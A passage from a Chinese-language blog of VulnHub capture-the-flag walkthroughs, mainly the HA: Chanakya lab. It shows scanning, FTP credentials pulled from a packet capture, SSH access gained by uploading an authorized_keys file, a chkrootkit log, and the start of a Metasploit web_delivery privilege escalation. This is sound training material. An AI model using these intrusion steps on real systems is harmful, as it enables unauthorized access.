created</span><br><span class="line">creating shared library</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>找到flag，帅爆了。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/root</span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line">ls -la</span><br><span class="line">total 44</span><br><span class="line">drwx------  3 root root 4096 Apr 29  2018 .</span><br><span class="line">drwxr-xr-x 22 root root 4096 Apr 24  2018 ..</span><br><span class="line">-rw-r--r--  1 root root   19 May  3  2018 .bash_history</span><br><span class="line">-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc</span><br><span class="line">drwx------  2 root root 4096 Apr 28  2018 .cache</span><br><span class="line">-rw-------  1 root root  144 Apr 29  2018 .flag.txt</span><br><span class="line">-rw-r--r--  1 root root  140 Feb 19  2014 .profile</span><br><span class="line">-rw-------  1 root root 1024 Apr 23  2018 .rnd</span><br><span class="line">-rw-------  1 root root 8296 Apr 29  2018 .viminfo</span><br><span class="line"><span class="comment"># cat .flag.txt</span></span><br><span class="line">cat .flag.txt</span><br><span class="line">Alec told me to place the codes here: </span><br><span class="line"></span><br><span class="line">568628e0d993b1973adc718237da6e93</span><br><span class="line"></span><br><span class="line">If you captured this make sure to go here.....</span><br><span class="line">/006-final/xvf7-flag/</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub147.jpg"></p>
<p>最后的flag是这个</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub148.jpg"></p>
<p>一张动图,蛮有意思的。</p>
<ul>
<li>知识点总结：</li>
</ul>
<p>1.telnet邮件泄露<br>2.图片隐写<br>3.moodle管理员账户远程代码执行<br>4.Ubuntu 14.04.1版本提权<br>5.exp overlayfs[EDB-37292] 编译cc执行</p>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[HA-Chanakya]</title>
    <url>/2019/12/16/HA-Chanakya/</url>
    <content><![CDATA[<p>名称：HA: Chanakya<br>发布日期：2019年11月9日</p>
<p>下载：</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOUl5Q0FlOTFfRWVFTHdqVEZxb1o0X2Z3SEtVUk5CRDQvdmlldz91c3A9c2hhcmluZw==">https://drive.google.com/file/d/19IyCAe91_EeELwjTFqoZ4_fwHKURNBD4/view?usp=sharing<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYS9jaGFuYWt5YS56aXA=">https://download.vulnhub.com/ha/chanakya.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYS9jaGFuYWt5YS56aXAudG9ycmVudA==">https://download.vulnhub.com/ha/chanakya.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：</p>
<p>摧毁王国的策划者又回来了，这次他创造了一个难题，会让你挠头！ 是时候面对Chanakya。<br>您能否解决这个“从根本上启动”并证明自己比较明智？<br>枚举是关键！！！！</p>
<p>级别：中级</p>
<p>任务：枚举目标计算机并获得root用户访问权限。</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>老规矩上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.142.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.142.130</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">MAC Address: 00:0C:29:BB:CA:D3 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -sV -Pn -T4 -v --script=vuln 192.168.142.130</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     pyftpdlib 1.0.0 or later</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /images/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.4.29 (ubuntu)&#x27;</span></span><br><span class="line">| http-internal-ip-disclosure: </span><br><span class="line">|_  Internal IP Leaked: 127.0.1.1</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">| vulners: </span></span><br><span class="line"><span class="string">|   cpe:/a:apache:http_server:2.4.29: </span></span><br><span class="line"><span class="string">|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211</span></span><br><span class="line"><span class="string">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span></span><br><span class="line"><span class="string">|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715</span></span><br><span class="line"><span class="string">|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082</span></span><br><span class="line"><span class="string">|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217</span></span><br><span class="line"><span class="string">|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098</span></span><br><span class="line"><span class="string">|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081</span></span><br><span class="line"><span class="string">|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220</span></span><br><span class="line"><span class="string">|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196</span></span><br><span class="line"><span class="string">|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199</span></span><br><span class="line"><span class="string">|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333</span></span><br><span class="line"><span class="string">|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710</span></span><br><span class="line"><span class="string">|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197</span></span><br><span class="line"><span class="string">|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092</span></span><br><span class="line"><span class="string">|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763</span></span><br><span class="line"><span class="string">|_      CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283</span></span><br></pre></td></tr></table></figure>

<p>dirb目录扫一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.142.130/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Dec 15 22:27:13 2019</span><br><span class="line">URL_BASE: http://192.168.142.130/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.142.130/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.142.130/assets/                                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.142.130/images/                                                         </span><br><span class="line">+ http://192.168.142.130/index.html (CODE:200|SIZE:2382)                                              </span><br><span class="line">+ http://192.168.142.130/server-status (CODE:403|SIZE:280)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># dirb http://192.168.142.130/ -X .txt</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Dec 15 22:28:34 2019</span><br><span class="line">URL_BASE: http://192.168.142.130/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">EXTENSIONS_LIST: (.txt) | (.txt) [NUM = 1]</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.142.130/ ----</span><br><span class="line">+ http://192.168.142.130/abuse.txt (CODE:200|SIZE:14)</span><br></pre></td></tr></table></figure>

<p>访问该txt文件发现如下内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nfubxn.cpncat</span><br></pre></td></tr></table></figure>

<p>使用<span class="exturl" data-url="aHR0cHM6Ly9yb3QxMy5jb20v">rot13.com<i class="fa fa-external-link-alt"></i></span>进行rot13解密，解密出来是ashoka.pcapng，然后访问(<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTQyLjEzMC9hc2hva2EucGNhcG5nKSwlRTUlQjAlODYlRTYlQUQlQTQlRTYlOTYlODclRTQlQkIlQjYlRTQlQjglOEIlRTglQkQlQkQlRUYlQkMlOEMlRTclODQlQjYlRTUlOTAlOEV3aXJlc2hhcmslRTYlODklOTMlRTUlQkMlODAlRTglQUYlQTUlRTYlOTYlODclRTQlQkIlQjYlRTMlODAlODI=">http://192.168.142.130/ashoka.pcapng),将此文件下载，然后wireshark打开该文件。<i class="fa fa-external-link-alt"></i></span></p>
<p>在Wireshark中打开捕获的文件，然后跟随ftp流量的tcp流，并获得ftp的用户名ashoka和密码kautilya。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub63.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">220 pyftpdlib based ftpd ready.</span><br><span class="line">USER ashoka</span><br><span class="line">331 Username ok, send password.</span><br><span class="line">PASS kautilya</span><br><span class="line">230 Login successful.</span><br><span class="line">SYST</span><br><span class="line">215 UNIX Type: L8</span><br><span class="line">FEAT</span><br><span class="line">211-Features supported:</span><br><span class="line"> EPRT</span><br><span class="line"> EPSV</span><br><span class="line"> MDTM</span><br><span class="line"> MLST <span class="built_in">type</span>*;perm*;size*;modify*;unique*;unix.mode;unix.uid;unix.gid;</span><br><span class="line"> REST STREAM</span><br><span class="line"> SIZE</span><br><span class="line"> TVFS</span><br><span class="line"> UTF8</span><br><span class="line">211 End FEAT.</span><br><span class="line">OPTS UTF8 ON</span><br><span class="line">501 Invalid argument.</span><br><span class="line">PWD</span><br><span class="line">257 <span class="string">&quot;/&quot;</span> is the current directory.</span><br><span class="line">TYPE A</span><br><span class="line">200 Type <span class="built_in">set</span> to: ASCII.</span><br><span class="line">PASV</span><br><span class="line">227 Entering passive mode (192,168,1,101,177,201).</span><br><span class="line">MLSD</span><br><span class="line">150 File status okay. About to open data connection.</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure>

<p>现在有了FTP登录凭据，登录到FTP服务器。 登录后，运行ls命令环顾四周。 发现在根目录中。 因此，决定通过将SSH放置在此位置来完成ssh的操作。 为此，创建一个名为“ .ssh”的目录。 遍历这个新创建的目录后，回到本机终端。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ftp 192.168.142.130</span></span><br><span class="line">Connected to 192.168.142.130.</span><br><span class="line">220 pyftpdlib based ftpd ready.</span><br><span class="line">Name (192.168.142.130:root): ashoka</span><br><span class="line">331 Username ok, send password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 Active data connection established.</span><br><span class="line">125 Data connection already open. Transfer starting.</span><br><span class="line">-rw-------   1 ashoka   ashoka          1 Nov 05 15:57 .bash_history</span><br><span class="line">-rw-r--r--   1 ashoka   ashoka        220 Nov 05 14:05 .bash_logout</span><br><span class="line">-rw-r--r--   1 ashoka   ashoka       3771 Nov 05 14:05 .bashrc</span><br><span class="line">drwx------   2 ashoka   ashoka       4096 Nov 05 14:18 .cache</span><br><span class="line">drwxrwxr-x   3 ashoka   ashoka       4096 Nov 05 14:26 .<span class="built_in">local</span></span><br><span class="line">-rw-r--r--   1 ashoka   ashoka        807 Nov 05 14:05 .profile</span><br><span class="line">226 Transfer complete.</span><br><span class="line">ftp&gt; mkdir .ssh</span><br><span class="line">257 <span class="string">&quot;/.ssh&quot;</span> directory created.</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> .ssh</span><br><span class="line">250 <span class="string">&quot;/.ssh&quot;</span> is the current directory.</span><br></pre></td></tr></table></figure>

<p>现在该生成一些ssh密钥了。 使用ssh-keygen创建了一些密钥。 输入的密码为“ 123”。 这可以是您选择的任何东西。 将其保留下来以便于记忆。 在创建密钥之后继续前进，进入了本机shell程序的.ssh目录。 在这里，看到了名为“ id_rsa.pub”的密钥。 现在需要将此密钥上传到FTP，因此将is_rsa.pub的内容复制到名为authorized_keys的文件中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/.ssh<span class="comment"># ls</span></span><br><span class="line">id_rsa  id_rsa.pub  known_hosts</span><br><span class="line">root@kali:~/.ssh<span class="comment"># cat id_rsa.pub &gt; authorized_keys</span></span><br><span class="line">root@kali:~/.ssh<span class="comment"># ls</span></span><br><span class="line">authorized_keys  id_rsa  id_rsa.pub  known_hosts</span><br><span class="line">root@kali:~/.ssh<span class="comment"># cat id_rsa.pub</span></span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTIuh8j20bp4uFWWmOn9IXRvRYDVvBjARjPeCZ7o00nnwTzJ/Y1OBU1AoDVNIq6aM/CVJ9qCy0zceqNfC1roGUM+cvUVO+qR5aG+QnT8mxdRnoXin+JAk8nFuynJ63016zuauB0iQUwyQ9dRm+jzW9+J/9S86Fd/qcbKNYbW5wn9Chh3T+bj+T+6RCKlU7q6q+Kc1S4WfI7iXJ6doR9hxD91CRUVWG/KyADbZuWsTuDyxxrQ/KA8ek05owsokgIc9rS8ZjtB23rR1yai/B3hfjjQgKMQkF6k9D7J6Qm07VgDZkYm4RTxlO8bDDnfkNOBs9rzBomPrN2rOeounir4ZIj+dDDpH9tGklDLyCW6RKx8fiN/s9z5Knf61a+9nielEO8DUqaEt+bHTl/3uVimZ01upoLEamclLadpMSBfT6CccUnD2bu4Kcb9kcOjHTW4pQEL9BXSu+upvQDJyRsPxy1JLNZ5xdkJoQKyt5OArNjUq7SsVAOZzNQRaM3JGit9s= root@kali</span><br><span class="line">root@kali:~/.ssh<span class="comment"># cat authorized_keys </span></span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTIuh8j20bp4uFWWmOn9IXRvRYDVvBjARjPeCZ7o00nnwTzJ/Y1OBU1AoDVNIq6aM/CVJ9qCy0zceqNfC1roGUM+cvUVO+qR5aG+QnT8mxdRnoXin+JAk8nFuynJ63016zuauB0iQUwyQ9dRm+jzW9+J/9S86Fd/qcbKNYbW5wn9Chh3T+bj+T+6RCKlU7q6q+Kc1S4WfI7iXJ6doR9hxD91CRUVWG/KyADbZuWsTuDyxxrQ/KA8ek05owsokgIc9rS8ZjtB23rR1yai/B3hfjjQgKMQkF6k9D7J6Qm07VgDZkYm4RTxlO8bDDnfkNOBs9rzBomPrN2rOeounir4ZIj+dDDpH9tGklDLyCW6RKx8fiN/s9z5Knf61a+9nielEO8DUqaEt+bHTl/3uVimZ01upoLEamclLadpMSBfT6CccUnD2bu4Kcb9kcOjHTW4pQEL9BXSu+upvQDJyRsPxy1JLNZ5xdkJoQKyt5OArNjUq7SsVAOZzNQRaM3JGit9s= root@kali</span><br><span class="line">root@kali:~/.ssh<span class="comment"># ls</span></span><br><span class="line">authorized_keys  id_rsa  id_rsa.pub  known_hosts</span><br></pre></td></tr></table></figure>
<p>使用put命令将文件传输到目标计算机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp&gt; put authorized_keys </span><br><span class="line"><span class="built_in">local</span>: authorized_keys remote: authorized_keys</span><br><span class="line">200 Active data connection established.</span><br><span class="line">125 Data connection already open. Transfer starting.</span><br><span class="line">226 Transfer complete.</span><br><span class="line">563 bytes sent <span class="keyword">in</span> 0.00 secs (14.5113 MB/s)</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 Active data connection established.</span><br><span class="line">125 Data connection already open. Transfer starting.</span><br><span class="line">-rw-r--r--   1 root     root          563 Dec 16 05:30 authorized_keys</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure>

<p>现在，使用ssh连接到目标计算机。 由于之前放置了授权密钥，因此现在可以登录。 得到了Ashoka用户的shell。 经过一些枚举，看到临时文件中有一个日志文件。 尝试使用cat命令。 看起来像Chkrootkit测试结果日志。 这提示也许可以使用Chkrootkit在此计算机上升级特权。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh ashoka@192.168.142.130</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.142.130 (192.168.142.130)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:cuEf1JsbferQL5tQ/iVC9mGMCIALDE5/sX/OJt5LgPQ.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.142.130<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Canonical Livepatch is available for installation.</span></span><br><span class="line"><span class="string">   - Reduce system reboots and improve kernel security. Activate at:</span></span><br><span class="line"><span class="string">     https://ubuntu.com/livepatch</span></span><br><span class="line"><span class="string">Last login: Tue Nov  5 06:36:00 2019 from 192.168.1.107</span></span><br><span class="line"><span class="string">ashoka@ubuntu:~$ id</span></span><br><span class="line"><span class="string">uid=1001(ashoka) gid=1001(ashoka) groups=1001(ashoka)</span></span><br><span class="line"><span class="string">ashoka@ubuntu:~$ whoami</span></span><br><span class="line"><span class="string">ashoka</span></span><br><span class="line"><span class="string">ashoka@ubuntu:~$ cat /tmp/logs</span></span><br><span class="line"><span class="string">ROOTDIR is `/&#x27;</span></span><br><span class="line">Checking `amd<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `basename&#x27;</span>... not infected</span><br><span class="line">Checking `biff<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `chfn&#x27;</span>... not infected</span><br><span class="line">Checking `chsh<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `cron&#x27;</span>... not infected</span><br><span class="line">Checking `crontab<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `date&#x27;</span>... not infected</span><br><span class="line">Checking `du<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `dirname&#x27;</span>... not infected</span><br><span class="line">Checking `<span class="built_in">echo</span><span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `egrep&#x27;</span>... not infected</span><br><span class="line">Checking `env<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `find&#x27;</span>... not infected</span><br><span class="line">Checking `fingerd<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `gpm&#x27;</span>... not found</span><br><span class="line">Checking `grep<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `hdparm&#x27;</span>... not infected</span><br><span class="line">Checking `su<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `ifconfig&#x27;</span>... not infected</span><br><span class="line">Checking `inetd<span class="string">&#x27;... not tested</span></span><br><span class="line"><span class="string">Checking `inetdconf&#x27;</span>... not found</span><br><span class="line">Checking `identd<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `init&#x27;</span>... not infected</span><br><span class="line">Checking `killall<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `ldsopreload&#x27;</span>... can<span class="string">&#x27;t exec ./strings-static, not tested</span></span><br><span class="line"><span class="string">Checking `login&#x27;</span>... not infected</span><br><span class="line">Checking `ls<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `lsof&#x27;</span>... not infected</span><br><span class="line">Checking `mail<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `mingetty&#x27;</span>... not found</span><br><span class="line">Checking `netstat<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `named&#x27;</span>... not found</span><br><span class="line">Checking `passwd<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `pidof&#x27;</span>... not infected</span><br><span class="line">Checking `pop2<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `pop3&#x27;</span>... not found</span><br><span class="line">Checking `ps<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `pstree&#x27;</span>... not infected</span><br><span class="line">Checking `rpcinfo<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `rlogind&#x27;</span>... not found</span><br><span class="line">Checking `rshd<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `slogin&#x27;</span>... not infected</span><br><span class="line">Checking `sendmail<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `sshd&#x27;</span>... not infected</span><br><span class="line">Checking `syslogd<span class="string">&#x27;... not tested</span></span><br><span class="line"><span class="string">Checking `tar&#x27;</span>... not infected</span><br><span class="line">Checking `tcpd<span class="string">&#x27;... INFECTED</span></span><br><span class="line"><span class="string">Checking `tcpdump&#x27;</span>... not infected</span><br><span class="line">Checking `top<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `telnetd&#x27;</span>... not found</span><br><span class="line">Checking `timed<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `traceroute&#x27;</span>... not found</span><br><span class="line">Checking `vdir<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `w&#x27;</span>... not infected</span><br><span class="line">Checking `write<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `aliens&#x27;</span>... no suspect files</span><br><span class="line">Searching <span class="keyword">for</span> sniffer<span class="string">&#x27;s logs, it may take a while... nothing found</span></span><br><span class="line"><span class="string">Searching for HiDrootkit&#x27;</span>s default dir... nothing found</span><br><span class="line">Searching <span class="keyword">for</span> t0rn<span class="string">&#x27;s default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for t0rn&#x27;</span>s v8 defaults... nothing found</span><br><span class="line">Searching <span class="keyword">for</span> Lion Worm default files and <span class="built_in">dirs</span>... nothing found</span><br><span class="line">Searching <span class="keyword">for</span> RSHA<span class="string">&#x27;s default files and dir... nothing found</span></span><br><span class="line"><span class="string">Searching for RH-Sharpe&#x27;</span>s default files... nothing found</span><br><span class="line">Searching <span class="keyword">for</span> Ambient<span class="string">&#x27;s rootkit (ark) default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for suspicious files and dirs, it may take a while... </span></span><br><span class="line"><span class="string">/lib/modules/4.15.0-20-generic/vdso/.build-id</span></span><br><span class="line"><span class="string">/lib/modules/4.15.0-20-generic/vdso/.build-id</span></span><br><span class="line"><span class="string">Searching for LPD Worm files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for Ramen Worm files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for Maniac files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for RK17 files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for Ducoci rootkit... nothing found</span></span><br><span class="line"><span class="string">Searching for Adore Worm... nothing found</span></span><br><span class="line"><span class="string">Searching for ShitC Worm... nothing found</span></span><br><span class="line"><span class="string">Searching for Omega Worm... nothing found</span></span><br><span class="line"><span class="string">Searching for Sadmind/IIS Worm... nothing found</span></span><br><span class="line"><span class="string">Searching for MonKit... nothing found</span></span><br><span class="line"><span class="string">Searching for Showtee... nothing found</span></span><br><span class="line"><span class="string">Searching for OpticKit... nothing found</span></span><br><span class="line"><span class="string">Searching for T.R.K... nothing found</span></span><br><span class="line"><span class="string">Searching for Mithra... nothing found</span></span><br><span class="line"><span class="string">Searching for LOC rootkit... nothing found</span></span><br><span class="line"><span class="string">Searching for Romanian rootkit... nothing found</span></span><br><span class="line"><span class="string">Searching for Suckit rootkit... Warning: /sbin/init INFECTED</span></span><br><span class="line"><span class="string">Searching for Volc rootkit... nothing found</span></span><br><span class="line"><span class="string">Searching for Gold2 rootkit... nothing found</span></span><br><span class="line"><span class="string">Searching for TC2 Worm default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for Anonoying rootkit default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for ZK rootkit default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for ShKit rootkit default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for AjaKit rootkit default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for zaRwT rootkit default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for Madalin rootkit default files... nothing found</span></span><br><span class="line"><span class="string">Searching for Fu rootkit default files... nothing found</span></span><br><span class="line"><span class="string">Searching for ESRK rootkit default files... nothing found</span></span><br><span class="line"><span class="string">Searching for rootedoor... nothing found</span></span><br><span class="line"><span class="string">Searching for ENYELKM rootkit default files... nothing found</span></span><br><span class="line"><span class="string">Searching for common ssh-scanners default files... nothing found</span></span><br><span class="line"><span class="string">Searching for suspect PHP files... nothing found</span></span><br><span class="line"><span class="string">Searching for anomalies in shell history files... nothing found</span></span><br><span class="line"><span class="string">Checking `asp&#x27;</span>... not infected</span><br><span class="line">Checking `bindshell<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `lkm&#x27;</span>... not tested: can<span class="string">&#x27;t exec </span></span><br><span class="line"><span class="string">Checking `rexedcs&#x27;</span>... not found</span><br><span class="line">Checking `sniffer<span class="string">&#x27;... not tested: can&#x27;</span>t <span class="built_in">exec</span> ./ifpromisc</span><br><span class="line">Checking `w55808<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `wted&#x27;</span>... not tested: can<span class="string">&#x27;t exec ./chkwtmp</span></span><br><span class="line"><span class="string">Checking `scalper&#x27;</span>... not infected</span><br><span class="line">Checking `slapper<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `z2&#x27;</span>... not tested: can<span class="string">&#x27;t exec ./chklastlog</span></span><br><span class="line"><span class="string">Checking `chkutmp&#x27;</span>... not tested: can<span class="string">&#x27;t exec ./chkutmp</span></span><br><span class="line"><span class="string">Checking `OSX_RSPLUG&#x27;</span>... not infected</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>现在，要在目标计算机上升级特权，将需要在目标计算机上配备一个meterpreter，并在Metasploit的帮助下使用get root。 使用web_delivery漏洞利用meterpreter。 在use命令的帮助下选择了web_delivery利用，然后提供了lhost。 Lhost是目标计算机（Kali Linux）的IP地址。 将输入漏洞利用代码。 这将创建一个单行脚本，该脚本将使我们对目标计算机有一个meterpreter。</p>
